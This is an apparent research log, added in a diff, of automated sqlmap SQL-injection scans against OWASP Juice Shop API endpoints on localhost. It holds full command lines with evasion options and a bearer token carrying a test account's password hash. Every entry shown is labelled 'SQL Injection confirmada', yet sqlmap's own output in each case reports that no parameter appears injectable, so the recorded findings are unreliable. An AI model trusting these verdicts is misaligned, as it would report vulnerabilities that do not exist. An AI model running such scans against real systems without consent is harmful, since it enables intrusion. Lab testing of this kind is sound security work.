+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[,]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . ["]     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:32 /2026-06-01/
+  
+  [00:21:32] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:32] [INFO] loading tamper module 'space2comment'
+  [00:21:32] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:32] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:32] [INFO] flushing session file
+  [00:21:32] [INFO] testing connection to the target URL
+  [00:21:32] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:33] [INFO] testing if the target URL content is stable
+  [00:21:33] [INFO] target URL content is stable
+  [00:21:33] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:33] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:33] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:33] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:33] [WARNING] reflective value(s) found and filtering out
+  [00:21:33] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:33] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:34] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:34] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:34] [INFO] testing 'Generic inline queries'
+  [00:21:34] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:34] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:34] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:34] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:34] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:34] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:34] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:34] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:34] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 73 times
+  
+  [*] ending @ 00:21:34 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[32/41] Testando: api_cards_get_by_id
+  Método:    GET
+  Path:      /api/Cards/1
+  Descrição: Obter cartão por ID
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Cards/1" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_cards_get_by_id
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [,]     | .'| . |
+  |___|_  ["]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:35 /2026-06-01/
+  
+  [00:21:35] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:35] [INFO] loading tamper module 'space2comment'
+  [00:21:35] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:35] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:35] [INFO] flushing session file
+  [00:21:35] [INFO] testing connection to the target URL
+  [00:21:35] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
+  [00:21:35] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:35] [INFO] testing if the target URL content is stable
+  [00:21:36] [INFO] target URL content is stable
+  [00:21:36] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:36] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:36] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:36] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:36] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:36] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:36] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:36] [INFO] testing 'Generic inline queries'
+  [00:21:36] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:36] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:36] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:36] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:36] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:36] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:36] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:36] [WARNING] HTTP error codes detected during run:
+  400 (Bad Request) - 76 times
+  
+  [*] ending @ 00:21:36 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[33/41] Testando: api_quantitys_list
+  Método:    GET
+  Path:      /api/Quantitys
+  Descrição: Listar quantidades de produtos
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Quantitys" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_quantitys_list
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . ["]     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:37 /2026-06-01/
+  
+  [00:21:37] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:37] [INFO] loading tamper module 'space2comment'
+  [00:21:37] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.7151.104 ADG/11.1.4905 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:37] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:37] [INFO] flushing session file
+  [00:21:37] [INFO] testing connection to the target URL
+  [00:21:37] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:38] [INFO] testing if the target URL content is stable
+  [00:21:38] [INFO] target URL content is stable
+  [00:21:38] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:38] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:38] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:38] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:38] [WARNING] reflective value(s) found and filtering out
+  [00:21:38] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:38] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:39] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:39] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:39] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:39] [INFO] testing 'Generic inline queries'
+  [00:21:39] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:39] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:39] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:39] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:39] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:39] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:39] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:39] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:39] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 73 times
+  
+  [*] ending @ 00:21:39 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[34/41] Testando: api_quantitys_get_by_id
+  Método:    GET
+  Path:      /api/Quantitys/1
+  Descrição: Obter quantidade por ID
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Quantitys/1" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_quantitys_get_by_id
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [(]     | .'| . |
+  |___|_  [,]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:40 /2026-06-01/
+  
+  [00:21:40] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:40] [INFO] loading tamper module 'space2comment'
+  [00:21:40] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.7151.104 ADG/11.1.4905 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:41] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:41] [INFO] flushing session file
+  [00:21:41] [INFO] testing connection to the target URL
+  [00:21:41] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
+  [00:21:41] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:41] [INFO] testing if the target URL content is stable
+  [00:21:41] [INFO] target URL content is stable
+  [00:21:41] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:41] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:41] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:41] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:41] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:41] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:41] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:41] [INFO] testing 'Generic inline queries'
+  [00:21:41] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:41] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:41] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:42] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:42] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:42] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:42] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:42] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:42] [WARNING] HTTP error codes detected during run:
+  403 (Forbidden) - 76 times
+  
+  [*] ending @ 00:21:42 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[35/41] Testando: api_memories_list
+  Método:    GET
+  Path:      /api/Memories
+  Descrição: Listar memórias (fotos do mural)
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Memories" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_memories_list
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [)]     | .'| . |
+  |___|_  [,]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:42 /2026-06-01/
+  
+  [00:21:42] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:42] [INFO] loading tamper module 'space2comment'
+  [00:21:42] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:43] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:43] [INFO] flushing session file
+  [00:21:43] [INFO] testing connection to the target URL
+  [00:21:43] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+  [00:21:43] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:43] [WARNING] reflective value(s) found and filtering out
+  [00:21:43] [INFO] testing if the target URL content is stable
+  [00:21:43] [INFO] target URL content is stable
+  [00:21:43] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:43] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:43] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:43] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:44] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:44] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:44] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:44] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:44] [INFO] testing 'Generic inline queries'
+  [00:21:44] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:44] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:44] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:44] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:44] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:44] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:45] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:45] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:45] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 82 times
+  
+  [*] ending @ 00:21:45 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[36/41] Testando: api_memories_get_by_id
+  Método:    GET
+  Path:      /api/Memories/1
+  Descrição: Obter memória por ID
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Memories/1" --headers="Authorization: Bearer 